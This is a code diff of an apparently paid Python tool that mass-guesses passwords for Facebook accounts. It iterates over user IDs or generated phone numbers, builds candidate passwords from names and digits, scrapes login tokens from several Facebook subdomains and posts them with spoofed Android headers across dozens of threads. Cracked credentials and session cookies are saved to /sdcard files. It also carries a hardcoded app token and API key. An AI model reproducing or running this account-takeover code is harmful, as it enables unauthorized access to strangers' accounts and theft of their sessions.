@@ -1,9 +1,9 @@
 import os, sys, uuid, re, random, time, string, json,base64
 from io import BytesIO
 try:
-    
-    os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
-    import requests, rich,certifi,pycurl
+	
+	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+	import requests, rich,certifi,pycurl
 except:
     os.system("git pull")
     
@@ -23,13 +23,13 @@ version = "  v1"
 
 
 class sort:
-    def line():
+    def line(self):
         return "[b dark_sea_green2]━" * 37
 
-    def clear():
+    def clear(self):
         os.system("clear")
 
-    def logo():
+    def logo(self):
         aci = f'''    //   ) )                                      
    //___/ /  __     ( )   __      ___      ___    
   / ____ / //  ) ) / / //   ) ) //   ) ) //___) ) 
@@ -37,7 +37,7 @@ class sort:
 //       //      / / //   / / ((____   ((____{version}\n{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]PRINCE\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]Paid[/r]\n{sort.line()}'''
         print(aci)
 
-    def color():
+    def color(self):
         co = ['\x1b[1;93m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m']
         cx = random.choice(co)
         return cx
@@ -126,7 +126,7 @@ for brand in range(1000):
     d= str(random.randint(10,20))
     abc = a+b+c
     if not os.path.exists('device_info.txt'):
-         info()
+    	 info()
     else:
         infos = open('device_info.txt', 'r').read()
         version_, model_, brand_name_, width_, height_ = infos.split('$')
@@ -303,15 +303,26 @@ def filee():
             pwx.append(px)
     else:
         print(sort.line())
-    print("[b]    [red1][1] [spring_green1]Method 1")
-    print("[b]    [red1][2] [spring_green1]Method 2")
-    print("[b]    [red1][3] [spring_green1]Method 3")
-    print("[b]    [red1][4] [spring_green1]Method 4")
-    print("[b]    [red1][5] [spring_green1]Method 5")
-    print(sort.line())
-    meth = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
-
-    with ThreadPool(max_workers=80) as heron:
+    print(" Method 1")
+    print(" Method 2")
+    print(" Method 3")
+    print(" Method 4")
+    print(" Method 5")
+    print(" Method 6 (Best)")
+    meth = str(input(" \x1b[38;1;198m Π \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
+    if meth in ["1", "a", "A"]:
+        fb = "mbasic"
+    elif meth in ["2", "b", "B"]:
+        fb = "x"
+    elif meth in ["3", "c", "C"]:
+        fb = "p"
+    elif meth in ["4", "d", "D"]:
+        fb = "touch"
+    elif meth in ["5", "e", "E"]:
+        fb = "free"
+    else:
+        fb = "m"
+    with ThreadPool(max_workers=60) as heron:
         sort.clear()
         sort.logo()
         print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(file)))
@@ -321,16 +332,14 @@ def filee():
             try:
                 uid = mal.split("|")[0]
                 name = mal.split("|")[1]
-                heron.submit(file_sub, uid, pwx, name, meth, file)
+                heron.submit(file_sub, uid, pwx, name, meth, file, fb)
             except:
                 pass
 
 
-def file_sub(uid, pwx, name, meth, file):
+def file_sub(uid, pwx, name, meth, file, fb):
     global oks, loop, sys_ua
-    Session = requests.session()
-    shadid = random.choice(sys_ua)
-    custom_agent = ""
+    session = requests.session()
     try:
         sys.stdout.write(
             f"\r\x1b[38;1;196m\x1b[38;0;196m└\x1b[38;1;196m\x1b[38;0;196m\033[38;5;46m[{sort.color()}{today}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{loop}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m]\x1b[1;97m-\033[38;5;46m[\x1b[1;90m{'{:.1%}'.format(loop / len(file))}\033[38;5;46m] \r")
@@ -340,80 +349,71 @@ def file_sub(uid, pwx, name, meth, file):
             ls = name.split(' ')[1]
         except:
             ls = fs
-        for pw in pwx:
+        try:
+            for pw in pwx:
+                ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last',
+                                                                                                              ls).replace(
+                    'Name', name).replace('name', name.lower())
+                free_fb = session.get(f'https://{fb}.facebook.com').text
+                info = {"lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+                        "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+                        "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+                        "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
+                        "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
+                uax = ua()
+                ver1 = str(random.randrange(1, 99))
+                ver2 = str(random.randrange(90, 121))
+                lsd = lsb()
+                refer = referer()
+                dpr = str(random.randrange(2, 6))
+                sceme = random.choice(['light', 'dark'])
+                had = {
+                    'Host': f'{fb}.facebook.com',
+                    'content-length': str(random.randrange(1600, 1800, 10)),
+                    'sec-ch-ua': f'"Not_A Brand";v={ver1}, "Chromium";v={ver2}, "Android WebView";v={ver2}',
+                    'sec-ch-ua-mobile': '?1',
+                    'user-agent': uax,
+                    'x-response-format': 'JSONStream',
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'x-fb-lsd': lsd,
+                    'viewport-width': '360',
+                    'sec-ch-ua-platform-version': '""',
+                    'x-requested-with': 'XMLHttpRequest',
+                    'x-asbd-id': '129477',
+                    'dpr': dpr,
+                    'sec-ch-ua-full-version-list': '',
+                    'sec-ch-ua-model': '""',
+                    'sec-ch-prefers-color-scheme': sceme,
+                    'sec-ch-ua-platform': '"Android"',
+                    'accept': '*/*',
+                    'origin': f'https://{fb}.facebook.com',
+                    'sec-fetch-site': 'same-origin',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-dest': 'empty',
+                    'referer': f'https://{fb}.facebook.com/login/?wtsid=rdr_{refer}',
+                    'accept-encoding': 'gzip, deflate, br,',
+                    'accept-language': 'en-DE,en-US;q=0.9,en;q=0.8'}
+                url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+                session.post(url=url, data=info, headers=had)
+                heron_brand = session.cookies.get_dict().keys()
+                if "c_user" in heron_brand:
+                    coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
+                    xx = coki.split("c_user=")[1]
+                    xd = xx[:15]
+                    print(f"\r\r[SHADID-OK] {xd} <> {ps}\n[Cookies]{coki}")
+                    open("/sdcard/SD-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
+                    oks.append(xd)
+                    break
 
-            ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last',
-                                                                                                          ls).replace(
-                'Name', name).replace('name', name.lower())
+                elif "checkpoint" in heron_brand:
+                    pass
 
-            if meth in ["1", "01"]:
-                agent = shadid
-            elif meth in ["2", "02"]:
-                agent = Vivo()
-            elif meth in ["3", "03"]:
-                agent = Motorola()
-            elif meth in ["4", "04"]:
-                agent = Samsung()
-            else:
-                agent = custom_agent
-            data = {
-                "adid": str(uuid.uuid4()),
-                "format": "json",
-                "device_id": str(uuid.uuid4()),
-                "cpl": "true",
-                "family_device_id": str(uuid.uuid4()),
-                "credentials_type": "device_based_login_password",
-                "error_detail_type": "button_with_disabled",
-                "source": "device_based_login",
-                "email": uid,
-                "password": ps,
-                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
-                "generate_session_cookies": "1",
-                "meta_inf_fbmeta": "",
-                "advertiser_id": str(uuid.uuid4()),
-                "currently_logged_in_userid": "0",
-                "locale": "en_GB",
-                "client_country_code": "GB",
-                "method": "auth.login",
-                "fb_api_req_friendly_name": "authenticate",
-                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                "api_key": "882a8490361da98702bf97a021ddc14d"}
-            head = {
-                'User-Agent': agent,
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Host': 'graph.facebook.com',
-                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-                'X-FB-Connection-Type': 'MOBILE.LTE',
-                'X-Tigon-Is-Retry': 'False',
-                'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-                'X-fb-device-group': '5120',
-                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                'X-FB-Request-Analytics-Tags': 'graphservice',
-                'X-FB-HTTP-Engine': 'Liger',
-                'X-FB-Client-IP': 'True',
-                'X-FB-Server-Cluster': 'True',
-                'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', }
-            url1 = 'https://b-graph.facebook.com/auth/login'
-            po = Session.post(url=url1, data=data, headers=head, allow_redirects=False).json()
-
-            if "session_key" in po:
-                oks.append(uid)
-                coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
-                print(
-                    f"\r\r[reverse white][PYC-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
-                open("/sdcard/pyc_file.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
-                break
-            elif "Please Confirm Email" in str(po):
-                oks.append(uid)
-                coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
-                print(
-                    f"\r\r[reverse white][PYC-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
-                open("/sdcard/pyc_file.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
-                break
-            else:
-                continue
-        loop += 1
+                    # print(f"\r\r[green] [CP-ID] {uid} | {ps}")
+                else:
+                    continue
+            loop += 1
+        except Exception as e:
+            time.sleep(30)
     except:
 
         time.sleep(30)
@@ -430,7 +430,7 @@ def ran():
     if ask in ["1", "01", "a", "A"]:
         print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]IND Number")
         print(sort.line())
-        print("[b]     [red1]✗ [chartreuse1] Without country code 10 digit EX [orange3]▶  [chartreuse1]6293799675, 7012878836")
+        print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]+91629, +91701")
         code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
         print(sort.line())
         print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
@@ -462,7 +462,7 @@ def ran():
     print(sort.line())
     meth = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
     if meth in ["1", "a", "A"]:
-        fb = "m"
+        fb = "mbasic"
     elif meth in ["2", "b", "B"]:
         fb = "x"
     elif meth in ["3", "c", "C"]:
@@ -472,23 +472,23 @@ def ran():
     elif meth in ["5", "e", "E"]:
         fb = "free"
     else:
-        fb = "mbasic"
-    
-    with ThreadPool(max_workers=60) as heron:
+        fb = "m"
+    if meth in ["1", "a", "A"]:
+    	mw = 30
+    else:
+    	mw = 90
+    with ThreadPool(max_workers=mw) as heron:
         sort.clear()
         sort.logo()
         print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
         print(f" [b]    [red1]✗ [light_green]Method   [orange3]▶  [light_green] M" + meth)
         print(sort.line())
         for xd in user:
+            uid = "0" + xd
             if ask in ["1", "01", "a", "A"]:
-                uid = "91" + xd
+                pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[1:]]
             else:
-                uid = "0" + xd
-            if ask in ["1", "01", "a", "A"]:
-                pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[2:]]
-            else:
-                pwx = [uid, uid[:6], uid[:8], xd[4:], xd[2:]]# , "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
+                pwx = [uid, uid[:6], uid[:8], xd[4], xd[2:]]   # , "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
             heron.submit(ren_sub, uid, pwx, meth, user, fb)
 
 
@@ -665,7 +665,7 @@ def approve():
         sys.exit("[!!] Internet Error...")
     
     if showkey in datax:
-        
+    	
         print("Checking Subscription")
         time.sleep(3)
         main()
@@ -674,6 +674,6 @@ def approve():
         
         print("your Key ->   "+showkey)
         input("This is paid tool bro. If you want to buy press enter. ")
-        tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+ showkey);os.system('am start https://wa.me/+8801617687239?text='+tks)
+        tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+showkey);os.system('am start https://wa.me/+8801617687239?text='+tks)
         sys.exit()
 approve()
